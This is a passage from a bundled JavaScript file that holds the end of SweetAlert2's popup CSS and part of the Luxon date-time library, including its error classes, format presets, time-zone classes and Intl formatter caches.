div:where(.swal2-popup){display:none;position:relative;box-sizing:border-box;grid-template-columns:minmax(0, 100%);width:32em;max-width:100%;padding:0 0 1.25em;border:none;border-radius:5px;background:#fff;color:hsl(0,0%,33%);font-family:inherit;font-size:1rem}div:where(.swal2-container) div:where(.swal2-popup):focus{outline:none}div:where(.swal2-container) div:where(.swal2-popup).swal2-loading{overflow-y:hidden}div:where(.swal2-container) h2:where(.swal2-title){position:relative;max-width:100%;margin:0;padding:.8em 1em 0;color:inherit;font-size:1.875em;font-weight:600;text-align:center;text-transform:none;word-wrap:break-word}div:where(.swal2-container) div:where(.swal2-actions){display:flex;z-index:1;box-sizing:border-box;flex-wrap:wrap;align-items:center;justify-content:center;width:auto;margin:1.25em auto 0;padding:0}div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled[disabled]{opacity:.4}div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled:hover{background-image:linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1))}div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled:active{background-image:linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2))}div:where(.swal2-container) div:where(.swal2-loader){display:none;align-items:center;justify-content:center;width:2.2em;height:2.2em;margin:0 1.875em;animation:swal2-rotate-loading 1.5s linear 0s infinite normal;border-width:.25em;border-style:solid;border-radius:100%;border-color:#2778c4 rgba(0,0,0,0) #2778c4 rgba(0,0,0,0)}div:where(.swal2-container) button:where(.swal2-styled){margin:.3125em;padding:.625em 1.1em;transition:box-shadow .1s;box-shadow:0 0 0 3px rgba(0,0,0,0);font-weight:500}div:where(.swal2-container) button:where(.swal2-styled):not([disabled]){cursor:pointer}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-confirm){border:0;border-radius:.25em;background:initial;background-color:#7066e0;color:#fff;font-size:1em}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-confirm):focus-visible{box-shadow:0 0 0 3px rgba(112,102,224,.5)}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-deny){border:0;border-radius:.25em;background:initial;background-color:#dc3741;color:#fff;font-size:1em}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-deny):focus-visible{box-shadow:0 0 0 3px rgba(220,55,65,.5)}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-cancel){border:0;border-radius:.25em;background:initial;background-color:#6e7881;color:#fff;font-size:1em}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-cancel):focus-visible{box-shadow:0 0 0 3px rgba(110,120,129,.5)}div:where(.swal2-container) button:where(.swal2-styled).swal2-default-outline:focus-visible{box-shadow:0 0 0 3px rgba(100,150,200,.5)}div:where(.swal2-container) button:where(.swal2-styled):focus-visible{outline:none}div:where(.swal2-container) button:where(.swal2-styled)::-moz-focus-inner{border:0}div:where(.swal2-container) div:where(.swal2-footer){margin:1em 0 0;padding:1em 1em 0;border-top:1px solid #eee;color:inherit;font-size:1em;text-align:center}div:where(.swal2-container) .swal2-timer-progress-bar-container{position:absolute;right:0;bottom:0;left:0;grid-column:auto !important;overflow:hidden;border-bottom-right-radius:5px;border-bottom-left-radius:5px}div:where(.swal2-container) div:where(.swal2-timer-progress-bar){width:100%;height:.25em;background:rgba(0,0,0,.2)}div:where(.swal2-container) img:where(.swal2-image){max-width:100%;margin:2em auto 1em}div:where(.swal2-container) button:where(.swal2-close){z-index:2;align-items:center;justify-content:center;width:1.2em;height:1.2em;margin-top:0;margin-right:0;margin-bottom:-1.2em;padding:0;overflow:hidden;transition:color .1s,box-shadow .1s;border:none;border-radius:5px;background:rgba(0,0,0,0);color:#ccc;font-family:monospace;font-size:2.5em;cursor:pointer;justify-self:end}div:where(.swal2-container) button:where(.swal2-close):hover{transform:none;background:rgba(0,0,0,0);color:#f27474}div:where(.swal2-container) button:where(.swal2-close):focus-visible{outline:none;box-shadow:inset 0 0 0 3px rgba(100,150,200,.5)}div:where(.swal2-container) button:where(.swal2-close)::-moz-focus-inner{border:0}div:where(.swal2-container) .swal2-html-container{z-index:1;justify-content:center;margin:0;padding:1em 1.6em .3em;overflow:auto;color:inherit;font-size:1.125em;font-weight:normal;line-height:normal;text-align:center;word-wrap:break-word;word-break:break-word}div:where(.swal2-container) input:where(.swal2-input),div:where(.swal2-container) input:where(.swal2-file),div:where(.swal2-container) textarea:where(.swal2-textarea),div:where(.swal2-container) select:where(.swal2-select),div:where(.swal2-container) div:where(.swal2-radio),div:where(.swal2-container) label:where(.swal2-checkbox){margin:1em 2em 3px}div:where(.swal2-container) input:where(.swal2-input),div:where(.swal2-container) input:where(.swal2-file),div:where(.swal2-container) textarea:where(.swal2-textarea){box-sizing:border-box;width:auto;transition:border-color .1s,box-shadow .1s;border:1px solid hsl(0,0%,85%);border-radius:.1875em;background:rgba(0,0,0,0);box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(0,0,0,0);color:inherit;font-size:1.125em}div:where(.swal2-container) input:where(.swal2-input).swal2-inputerror,div:where(.swal2-container) input:where(.swal2-file).swal2-inputerror,div:where(.swal2-container) textarea:where(.swal2-textarea).swal2-inputerror{border-color:#f27474 !important;box-shadow:0 0 2px #f27474 !important}div:where(.swal2-container) input:where(.swal2-input):focus,div:where(.swal2-container) input:where(.swal2-file):focus,div:where(.swal2-container) textarea:where(.swal2-textarea):focus{border:1px solid #b4dbed;outline:none;box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(100,150,200,.5)}div:where(.swal2-container) input:where(.swal2-input)::placeholder,div:where(.swal2-container) input:where(.swal2-file)::placeholder,div:where(.swal2-container) textarea:where(.swal2-textarea)::placeholder{color:#ccc}div:where(.swal2-container) .swal2-range{margin:1em 2em 3px;background:#fff}div:where(.swal2-container) .swal2-range input{width:80%}div:where(.swal2-container) .swal2-range output{width:20%;color:inherit;font-weight:600;text-align:center}div:where(.swal2-container) .swal2-range input,div:where(.swal2-container) .swal2-range output{height:2.625em;padding:0;font-size:1.125em;line-height:2.625em}div:where(.swal2-container) .swal2-input{height:2.625em;padding:0 .75em}div:where(.swal2-container) .swal2-file{width:75%;margin-right:auto;margin-left:auto;background:rgba(0,0,0,0);font-size:1.125em}div:where(.swal2-container) .swal2-textarea{height:6.75em;padding:.75em}div:where(.swal2-container) .swal2-select{min-width:50%;max-width:100%;padding:.375em .625em;background:rgba(0,0,0,0);color:inherit;font-size:1.125em}div:where(.swal2-container) .swal2-radio,div:where(.swal2-container) .swal2-checkbox{align-items:center;justify-content:center;background:#fff;color:inherit}div:where(.swal2-container) .swal2-radio label,div:where(.swal2-container) .swal2-checkbox label{margin:0 .6em;font-size:1.125em}div:where(.swal2-container) .swal2-radio input,div:where(.swal2-container) .swal2-checkbox input{flex-shrink:0;margin:0 .4em}div:where(.swal2-container) label:where(.swal2-input-label){display:flex;justify-content:center;margin:1em auto 0}div:where(.swal2-container) div:where(.swal2-validation-message){align-items:center;justify-content:center;margin:1em 0 0;padding:.625em;overflow:hidden;background:hsl(0,0%,94%);color:#666;font-size:1em;font-weight:300}div:where(.swal2-container) div:where(.swal2-validation-message)::before{content:"!";display:inline-block;width:1.5em;min-width:1.5em;height:1.5em;margin:0 .625em;border-radius:50%;background-color:#f27474;color:#fff;font-weight:600;line-height:1.5em;text-align:center}div:where(.swal2-container) .swal2-progress-steps{flex-wrap:wrap;align-items:center;max-width:100%;margin:1.25em auto;padding:0;background:rgba(0,0,0,0);font-weight:600}div:where(.swal2-container) .swal2-progress-steps li{display:inline-block;position:relative}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step{z-index:20;flex-shrink:0;width:2em;height:2em;border-radius:2em;background:#2778c4;color:#fff;line-height:2em;text-align:center}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step{background:#2778c4}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step{background:#add8e6;color:#fff}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step-line{background:#add8e6}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step-line{z-index:10;flex-shrink:0;width:2.5em;height:.4em;margin:0 -1px;background:#2778c4}div:where(.swal2-icon){position:relative;box-sizing:content-box;justify-content:center;width:5em;height:5em;margin:2.5em auto .6em;border:0.25em solid rgba(0,0,0,0);border-radius:50%;border-color:#000;font-family:inherit;line-height:5em;cursor:default;user-select:none}div:where(.swal2-icon) .swal2-icon-content{display:flex;align-items:center;font-size:3.75em}div:where(.swal2-icon).swal2-error{border-color:#f27474;color:#f27474}div:where(.swal2-icon).swal2-error .swal2-x-mark{position:relative;flex-grow:1}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line]{display:block;position:absolute;top:2.3125em;width:2.9375em;height:.3125em;border-radius:.125em;background-color:#f27474}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line][class$=left]{left:1.0625em;transform:rotate(45deg)}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line][class$=right]{right:1em;transform:rotate(-45deg)}div:where(.swal2-icon).swal2-error.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-error.swal2-icon-show .swal2-x-mark{animation:swal2-animate-error-x-mark .5s}div:where(.swal2-icon).swal2-warning{border-color:rgb(249.95234375,205.965625,167.74765625);color:#f8bb86}div:where(.swal2-icon).swal2-warning.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-warning.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .5s}div:where(.swal2-icon).swal2-info{border-color:rgb(156.7033492823,224.2822966507,246.2966507177);color:#3fc3ee}div:where(.swal2-icon).swal2-info.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-info.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .8s}div:where(.swal2-icon).swal2-question{border-color:rgb(200.8064516129,217.9677419355,225.1935483871);color:#87adbd}div:where(.swal2-icon).swal2-question.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-question.swal2-icon-show .swal2-icon-content{animation:swal2-animate-question-mark .8s}div:where(.swal2-icon).swal2-success{border-color:#a5dc86;color:#a5dc86}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line]{position:absolute;width:3.75em;height:7.5em;border-radius:50%}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.4375em;left:-2.0635em;transform:rotate(-45deg);transform-origin:3.75em 3.75em;border-radius:7.5em 0 0 7.5em}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.6875em;left:1.875em;transform:rotate(-45deg);transform-origin:0 3.75em;border-radius:0 7.5em 7.5em 0}div:where(.swal2-icon).swal2-success .swal2-success-ring{position:absolute;z-index:2;top:-0.25em;left:-0.25em;box-sizing:content-box;width:100%;height:100%;border:.25em solid rgba(165,220,134,.3);border-radius:50%}div:where(.swal2-icon).swal2-success .swal2-success-fix{position:absolute;z-index:1;top:.5em;left:1.625em;width:.4375em;height:5.625em;transform:rotate(-45deg)}div:where(.swal2-icon).swal2-success [class^=swal2-success-line]{display:block;position:absolute;z-index:2;height:.3125em;border-radius:.125em;background-color:#a5dc86}div:where(.swal2-icon).swal2-success [class^=swal2-success-line][class$=tip]{top:2.875em;left:.8125em;width:1.5625em;transform:rotate(45deg)}div:where(.swal2-icon).swal2-success [class^=swal2-success-line][class$=long]{top:2.375em;right:.5em;width:2.9375em;transform:rotate(-45deg)}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-animate-success-line-tip .75s}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-animate-success-line-long .75s}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-circular-line-right{animation:swal2-rotate-success-circular-line 4.25s ease-in}[class^=swal2]{-webkit-tap-highlight-color:rgba(0,0,0,0)}.swal2-show{animation:swal2-show .3s}.swal2-hide{animation:swal2-hide .15s forwards}.swal2-noanimation{transition:none}.swal2-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}.swal2-rtl .swal2-close{margin-right:initial;margin-left:0}.swal2-rtl .swal2-timer-progress-bar{right:0;left:auto}@keyframes swal2-toast-show{0%{transform:translateY(-0.625em) rotateZ(2deg)}33%{transform:translateY(0) rotateZ(-2deg)}66%{transform:translateY(0.3125em) rotateZ(2deg)}100%{transform:translateY(0) rotateZ(0deg)}}@keyframes swal2-toast-hide{100%{transform:rotateZ(1deg);opacity:0}}@keyframes swal2-toast-animate-success-line-tip{0%{top:.5625em;left:.0625em;width:0}54%{top:.125em;left:.125em;width:0}70%{top:.625em;left:-0.25em;width:1.625em}84%{top:1.0625em;left:.75em;width:.5em}100%{top:1.125em;left:.1875em;width:.75em}}@keyframes swal2-toast-animate-success-line-long{0%{top:1.625em;right:1.375em;width:0}65%{top:1.25em;right:.9375em;width:0}84%{top:.9375em;right:0;width:1.125em}100%{top:.9375em;right:.1875em;width:1.375em}}@keyframes swal2-show{0%{transform:scale(0.7)}45%{transform:scale(1.05)}80%{transform:scale(0.95)}100%{transform:scale(1)}}@keyframes swal2-hide{0%{transform:scale(1);opacity:1}100%{transform:scale(0.5);opacity:0}}@keyframes swal2-animate-success-line-tip{0%{top:1.1875em;left:.0625em;width:0}54%{top:1.0625em;left:.125em;width:0}70%{top:2.1875em;left:-0.375em;width:3.125em}84%{top:3em;left:1.3125em;width:1.0625em}100%{top:2.8125em;left:.8125em;width:1.5625em}}@keyframes swal2-animate-success-line-long{0%{top:3.375em;right:2.875em;width:0}65%{top:3.375em;right:2.875em;width:0}84%{top:2.1875em;right:0;width:3.4375em}100%{top:2.375em;right:.5em;width:2.9375em}}@keyframes swal2-rotate-success-circular-line{0%{transform:rotate(-45deg)}5%{transform:rotate(-45deg)}12%{transform:rotate(-405deg)}100%{transform:rotate(-405deg)}}@keyframes swal2-animate-error-x-mark{0%{margin-top:1.625em;transform:scale(0.4);opacity:0}50%{margin-top:1.625em;transform:scale(0.4);opacity:0}80%{margin-top:-0.375em;transform:scale(1.15)}100%{margin-top:0;transform:scale(1);opacity:1}}@keyframes swal2-animate-error-icon{0%{transform:rotateX(100deg);opacity:0}100%{transform:rotateX(0deg);opacity:1}}@keyframes swal2-rotate-loading{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}@keyframes swal2-animate-question-mark{0%{transform:rotateY(-360deg)}100%{transform:rotateY(0)}}@keyframes swal2-animate-i-mark{0%{transform:rotateZ(45deg);opacity:0}25%{transform:rotateZ(-25deg);opacity:.4}50%{transform:rotateZ(15deg);opacity:.8}75%{transform:rotateZ(-5deg);opacity:1}100%{transform:rotateX(0);opacity:1}}body.swal2-shown:not(.swal2-no-backdrop,.swal2-toast-shown){overflow:hidden}body.swal2-height-auto{height:auto !important}body.swal2-no-backdrop .swal2-container{background-color:rgba(0,0,0,0) !important;pointer-events:none}body.swal2-no-backdrop .swal2-container .swal2-popup{pointer-events:all}body.swal2-no-backdrop .swal2-container .swal2-modal{box-shadow:0 0 10px rgba(0,0,0,.4)}@media print{body.swal2-shown:not(.swal2-no-backdrop,.swal2-toast-shown){overflow-y:scroll !important}body.swal2-shown:not(.swal2-no-backdrop,.swal2-toast-shown)>[aria-hidden=true]{display:none}body.swal2-shown:not(.swal2-no-backdrop,.swal2-toast-shown) .swal2-container{position:static !important}}body.swal2-toast-shown .swal2-container{box-sizing:border-box;width:360px;max-width:100%;background-color:rgba(0,0,0,0);pointer-events:none}body.swal2-toast-shown .swal2-container.swal2-top{inset:0 auto auto 50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-top-end,body.swal2-toast-shown .swal2-container.swal2-top-right{inset:0 0 auto auto}body.swal2-toast-shown .swal2-container.swal2-top-start,body.swal2-toast-shown .swal2-container.swal2-top-left{inset:0 auto auto 0}body.swal2-toast-shown .swal2-container.swal2-center-start,body.swal2-toast-shown .swal2-container.swal2-center-left{inset:50% auto auto 0;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-center{inset:50% auto auto 50%;transform:translate(-50%, -50%)}body.swal2-toast-shown .swal2-container.swal2-center-end,body.swal2-toast-shown .swal2-container.swal2-center-right{inset:50% 0 auto auto;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-start,body.swal2-toast-shown .swal2-container.swal2-bottom-left{inset:auto auto 0 0}body.swal2-toast-shown .swal2-container.swal2-bottom{inset:auto auto 0 50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-end,body.swal2-toast-shown .swal2-container.swal2-bottom-right{inset:auto 0 0 auto}');
class LuxonError extends Error {
}
class InvalidDateTimeError extends LuxonError {
  constructor(reason) {
    super(`Invalid DateTime: ${reason.toMessage()}`);
  }
}
class InvalidIntervalError extends LuxonError {
  constructor(reason) {
    super(`Invalid Interval: ${reason.toMessage()}`);
  }
}
class InvalidDurationError extends LuxonError {
  constructor(reason) {
    super(`Invalid Duration: ${reason.toMessage()}`);
  }
}
class ConflictingSpecificationError extends LuxonError {
}
class InvalidUnitError extends LuxonError {
  constructor(unit) {
    super(`Invalid unit ${unit}`);
  }
}
class InvalidArgumentError extends LuxonError {
}
class ZoneIsAbstractError extends LuxonError {
  constructor() {
    super("Zone is an abstract class");
  }
}
const n$1 = "numeric", s$1 = "short", l = "long";
const DATE_SHORT = {
  year: n$1,
  month: n$1,
  day: n$1
};
const DATE_MED = {
  year: n$1,
  month: s$1,
  day: n$1
};
const DATE_MED_WITH_WEEKDAY = {
  year: n$1,
  month: s$1,
  day: n$1,
  weekday: s$1
};
const DATE_FULL = {
  year: n$1,
  month: l,
  day: n$1
};
const DATE_HUGE = {
  year: n$1,
  month: l,
  day: n$1,
  weekday: l
};
const TIME_SIMPLE = {
  hour: n$1,
  minute: n$1
};
const TIME_WITH_SECONDS = {
  hour: n$1,
  minute: n$1,
  second: n$1
};
const TIME_WITH_SHORT_OFFSET = {
  hour: n$1,
  minute: n$1,
  second: n$1,
  timeZoneName: s$1
};
const TIME_WITH_LONG_OFFSET = {
  hour: n$1,
  minute: n$1,
  second: n$1,
  timeZoneName: l
};
const TIME_24_SIMPLE = {
  hour: n$1,
  minute: n$1,
  hourCycle: "h23"
};
const TIME_24_WITH_SECONDS = {
  hour: n$1,
  minute: n$1,
  second: n$1,
  hourCycle: "h23"
};
const TIME_24_WITH_SHORT_OFFSET = {
  hour: n$1,
  minute: n$1,
  second: n$1,
  hourCycle: "h23",
  timeZoneName: s$1
};
const TIME_24_WITH_LONG_OFFSET = {
  hour: n$1,
  minute: n$1,
  second: n$1,
  hourCycle: "h23",
  timeZoneName: l
};
const DATETIME_SHORT = {
  year: n$1,
  month: n$1,
  day: n$1,
  hour: n$1,
  minute: n$1
};
const DATETIME_SHORT_WITH_SECONDS = {
  year: n$1,
  month: n$1,
  day: n$1,
  hour: n$1,
  minute: n$1,
  second: n$1
};
const DATETIME_MED = {
  year: n$1,
  month: s$1,
  day: n$1,
  hour: n$1,
  minute: n$1
};
const DATETIME_MED_WITH_SECONDS = {
  year: n$1,
  month: s$1,
  day: n$1,
  hour: n$1,
  minute: n$1,
  second: n$1
};
const DATETIME_MED_WITH_WEEKDAY = {
  year: n$1,
  month: s$1,
  day: n$1,
  weekday: s$1,
  hour: n$1,
  minute: n$1
};
const DATETIME_FULL = {
  year: n$1,
  month: l,
  day: n$1,
  hour: n$1,
  minute: n$1,
  timeZoneName: s$1
};
const DATETIME_FULL_WITH_SECONDS = {
  year: n$1,
  month: l,
  day: n$1,
  hour: n$1,
  minute: n$1,
  second: n$1,
  timeZoneName: s$1
};
const DATETIME_HUGE = {
  year: n$1,
  month: l,
  day: n$1,
  weekday: l,
  hour: n$1,
  minute: n$1,
  timeZoneName: l
};
const DATETIME_HUGE_WITH_SECONDS = {
  year: n$1,
  month: l,
  day: n$1,
  weekday: l,
  hour: n$1,
  minute: n$1,
  second: n$1,
  timeZoneName: l
};
class Zone {
  /**
   * The type of zone
   * @abstract
   * @type {string}
   */
  get type() {
    throw new ZoneIsAbstractError();
  }
  /**
   * The name of this zone.
   * @abstract
   * @type {string}
   */
  get name() {
    throw new ZoneIsAbstractError();
  }
  /**
   * The IANA name of this zone.
   * Defaults to `name` if not overwritten by a subclass.
   * @abstract
   * @type {string}
   */
  get ianaName() {
    return this.name;
  }
  /**
   * Returns whether the offset is known to be fixed for the whole year.
   * @abstract
   * @type {boolean}
   */
  get isUniversal() {
    throw new ZoneIsAbstractError();
  }
  /**
   * Returns the offset's common name (such as EST) at the specified timestamp
   * @abstract
   * @param {number} ts - Epoch milliseconds for which to get the name
   * @param {Object} opts - Options to affect the format
   * @param {string} opts.format - What style of offset to return. Accepts 'long' or 'short'.
   * @param {string} opts.locale - What locale to return the offset name in.
   * @return {string}
   */
  offsetName(ts, opts) {
    throw new ZoneIsAbstractError();
  }
  /**
   * Returns the offset's value as a string
   * @abstract
   * @param {number} ts - Epoch milliseconds for which to get the offset
   * @param {string} format - What style of offset to return.
   *                          Accepts 'narrow', 'short', or 'techie'. Returning '+6', '+06:00', or '+0600' respectively
   * @return {string}
   */
  formatOffset(ts, format) {
    throw new ZoneIsAbstractError();
  }
  /**
   * Return the offset in minutes for this zone at the specified timestamp.
   * @abstract
   * @param {number} ts - Epoch milliseconds for which to compute the offset
   * @return {number}
   */
  offset(ts) {
    throw new ZoneIsAbstractError();
  }
  /**
   * Return whether this Zone is equal to another zone
   * @abstract
   * @param {Zone} otherZone - the zone to compare
   * @return {boolean}
   */
  equals(otherZone) {
    throw new ZoneIsAbstractError();
  }
  /**
   * Return whether this Zone is valid.
   * @abstract
   * @type {boolean}
   */
  get isValid() {
    throw new ZoneIsAbstractError();
  }
}
let singleton$1 = null;
class SystemZone extends Zone {
  /**
   * Get a singleton instance of the local zone
   * @return {SystemZone}
   */
  static get instance() {
    if (singleton$1 === null) {
      singleton$1 = new SystemZone();
    }
    return singleton$1;
  }
  /** @override **/
  get type() {
    return "system";
  }
  /** @override **/
  get name() {
    return new Intl.DateTimeFormat().resolvedOptions().timeZone;
  }
  /** @override **/
  get isUniversal() {
    return false;
  }
  /** @override **/
  offsetName(ts, { format, locale }) {
    return parseZoneInfo(ts, format, locale);
  }
  /** @override **/
  formatOffset(ts, format) {
    return formatOffset(this.offset(ts), format);
  }
  /** @override **/
  offset(ts) {
    return -new Date(ts).getTimezoneOffset();
  }
  /** @override **/
  equals(otherZone) {
    return otherZone.type === "system";
  }
  /** @override **/
  get isValid() {
    return true;
  }
}
let dtfCache = {};
function makeDTF(zone) {
  if (!dtfCache[zone]) {
    dtfCache[zone] = new Intl.DateTimeFormat("en-US", {
      hour12: false,
      timeZone: zone,
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      era: "short"
    });
  }
  return dtfCache[zone];
}
const typeToPos = {
  year: 0,
  month: 1,
  day: 2,
  era: 3,
  hour: 4,
  minute: 5,
  second: 6
};
function hackyOffset(dtf, date2) {
  const formatted = dtf.format(date2).replace(/\u200E/g, ""), parsed = /(\d+)\/(\d+)\/(\d+) (AD|BC),? (\d+):(\d+):(\d+)/.exec(formatted), [, fMonth, fDay, fYear, fadOrBc, fHour, fMinute, fSecond] = parsed;
  return [fYear, fMonth, fDay, fadOrBc, fHour, fMinute, fSecond];
}
function partsOffset(dtf, date2) {
  const formatted = dtf.formatToParts(date2);
  const filled = [];
  for (let i2 = 0; i2 < formatted.length; i2++) {
    const { type, value } = formatted[i2];
    const pos = typeToPos[type];
    if (type === "era") {
      filled[pos] = value;
    } else if (!isUndefined(pos)) {
      filled[pos] = parseInt(value, 10);
    }
  }
  return filled;
}
let ianaZoneCache = {};
class IANAZone extends Zone {
  /**
   * @param {string} name - Zone name
   * @return {IANAZone}
   */
  static create(name) {
    if (!ianaZoneCache[name]) {
      ianaZoneCache[name] = new IANAZone(name);
    }
    return ianaZoneCache[name];
  }
  /**
   * Reset local caches. Should only be necessary in testing scenarios.
   * @return {void}
   */
  static resetCache() {
    ianaZoneCache = {};
    dtfCache = {};
  }
  /**
   * Returns whether the provided string is a valid specifier. This only checks the string's format, not that the specifier identifies a known zone; see isValidZone for that.
   * @param {string} s - The string to check validity on
   * @example IANAZone.isValidSpecifier("America/New_York") //=> true
   * @example IANAZone.isValidSpecifier("Sport~~blorp") //=> false
   * @deprecated For backward compatibility, this forwards to isValidZone, better use `isValidZone()` directly instead.
   * @return {boolean}
   */
  static isValidSpecifier(s2) {
    return this.isValidZone(s2);
  }
  /**
   * Returns whether the provided string identifies a real zone
   * @param {string} zone - The string to check
   * @example IANAZone.isValidZone("America/New_York") //=> true
   * @example IANAZone.isValidZone("Fantasia/Castle") //=> false
   * @example IANAZone.isValidZone("Sport~~blorp") //=> false
   * @return {boolean}
   */
  static isValidZone(zone) {
    if (!zone) {
      return false;
    }
    try {
      new Intl.DateTimeFormat("en-US", { timeZone: zone }).format();
      return true;
    } catch (e2) {
      return false;
    }
  }
  constructor(name) {
    super();
    this.zoneName = name;
    this.valid = IANAZone.isValidZone(name);
  }
  /**
   * The type of zone. `iana` for all instances of `IANAZone`.
   * @override
   * @type {string}
   */
  get type() {
    return "iana";
  }
  /**
   * The name of this zone (i.e. the IANA zone name).
   * @override
   * @type {string}
   */
  get name() {
    return this.zoneName;
  }
  /**
   * Returns whether the offset is known to be fixed for the whole year:
   * Always returns false for all IANA zones.
   * @override
   * @type {boolean}
   */
  get isUniversal() {
    return false;
  }
  /**
   * Returns the offset's common name (such as EST) at the specified timestamp
   * @override
   * @param {number} ts - Epoch milliseconds for which to get the name
   * @param {Object} opts - Options to affect the format
   * @param {string} opts.format - What style of offset to return. Accepts 'long' or 'short'.
   * @param {string} opts.locale - What locale to return the offset name in.
   * @return {string}
   */
  offsetName(ts, { format, locale }) {
    return parseZoneInfo(ts, format, locale, this.name);
  }
  /**
   * Returns the offset's value as a string
   * @override
   * @param {number} ts - Epoch milliseconds for which to get the offset
   * @param {string} format - What style of offset to return.
   *                          Accepts 'narrow', 'short', or 'techie'. Returning '+6', '+06:00', or '+0600' respectively
   * @return {string}
   */
  formatOffset(ts, format) {
    return formatOffset(this.offset(ts), format);
  }
  /**
   * Return the offset in minutes for this zone at the specified timestamp.
   * @override
   * @param {number} ts - Epoch milliseconds for which to compute the offset
   * @return {number}
   */
  offset(ts) {
    const date2 = new Date(ts);
    if (isNaN(date2)) return NaN;
    const dtf = makeDTF(this.name);
    let [year, month, day, adOrBc, hour, minute, second] = dtf.formatToParts ? partsOffset(dtf, date2) : hackyOffset(dtf, date2);
    if (adOrBc === "BC") {
      year = -Math.abs(year) + 1;
    }
    const adjustedHour = hour === 24 ? 0 : hour;
    const asUTC = objToLocalTS({
      year,
      month,
      day,
      hour: adjustedHour,
      minute,
      second,
      millisecond: 0
    });
    let asTS = +date2;
    const over = asTS % 1e3;
    asTS -= over >= 0 ? over : 1e3 + over;
    return (asUTC - asTS) / (60 * 1e3);
  }
  /**
   * Return whether this Zone is equal to another zone
   * @override
   * @param {Zone} otherZone - the zone to compare
   * @return {boolean}
   */
  equals(otherZone) {
    return otherZone.type === "iana" && otherZone.name === this.name;
  }
  /**
   * Return whether this Zone is valid.
   * @override
   * @type {boolean}
   */
  get isValid() {
    return this.valid;
  }
}
let intlLFCache = {};
function getCachedLF(locString, opts = {}) {
  const key = JSON.stringify([locString, opts]);
  let dtf = intlLFCache[key];
  if (!dtf) {
    dtf = new Intl.ListFormat(locString, opts);
    intlLFCache[key] = dtf;
  }
  return dtf;
}
let intlDTCache = {};
function getCachedDTF(locString, opts = {}) {
  const key = JSON.stringify([locString, opts]);
  let dtf = intlDTCache[key];
  if (!dtf) {
    dtf = new Intl.DateTimeFormat(locString, opts);
    intlDTCache[key] = dtf;
  }
  return dtf;
}
let intlNumCache = {};
function getCachedINF(locString, opts = {}) {
  const key = JSON.stringify([locString, opts]);
  let inf = intlNumCache[key];
  if (!inf) {
    inf = new Intl.NumberFormat(locString, opts);
    intlNumCache[key] = inf;
  }
  return inf;
}
let intlRelCache = {};
function getCachedRTF(locString, opts = {}) {
  const { base, ...cacheKeyOpts } = opts;
  const key = JSON.stringify([locString, cacheKeyOpts]);
  let inf = intlRelCache[key];
  if (!inf) {
    inf = new Intl.RelativeTimeFormat(locString, opts);
    intlRelCache[key] = inf;
  }
  return inf;
}
let sysLocaleCache = null;
function systemLocale() {
  if (sysLocaleCache) {
    return sysLocaleCache;
  } else {
    sysLocaleCache = new Intl.DateTimeFormat().resolvedOptions().locale;
    return sysLocaleCache;
  }
}
let weekInfoCache = {};
function getCachedWeekInfo(locString) {
  let data = weekInfoCache[locString];
  if (!data) {
    const locale = new Intl.Locale(locString);
    data = "getWeekInfo" in locale ? locale.getWeekInfo() : locale.weekInfo;
    weekInfoCache[locString] = data;
  }
  return data;
}
function parseLocaleString(localeStr) {
  const xIndex = localeStr.indexOf("-x-");
  if (xIndex !== -1) {
    localeStr = localeStr.substring(0, xIndex);
  }
  const uIndex = localeStr.indexOf("-u-");
  if (uIndex === -1) {
    return [localeStr];
  } else {
    let options;
    let selectedStr;
    try {
      options = getCachedDTF(localeStr).resolvedOptions();
      selectedStr = localeStr;
    } catch (e2) {
      const smaller = localeStr.substring(0, uIndex);
      options = getCachedDTF(smaller).resolvedOptions();
      selectedStr = smaller;
    }
    const { numberingSystem, calendar } = options;
    return [selectedStr, numberingSystem, calendar];
  }
}
function intlConfigString(localeStr, numberingSystem, outputCalendar) {
  if (outputCalendar || numberingSystem) {
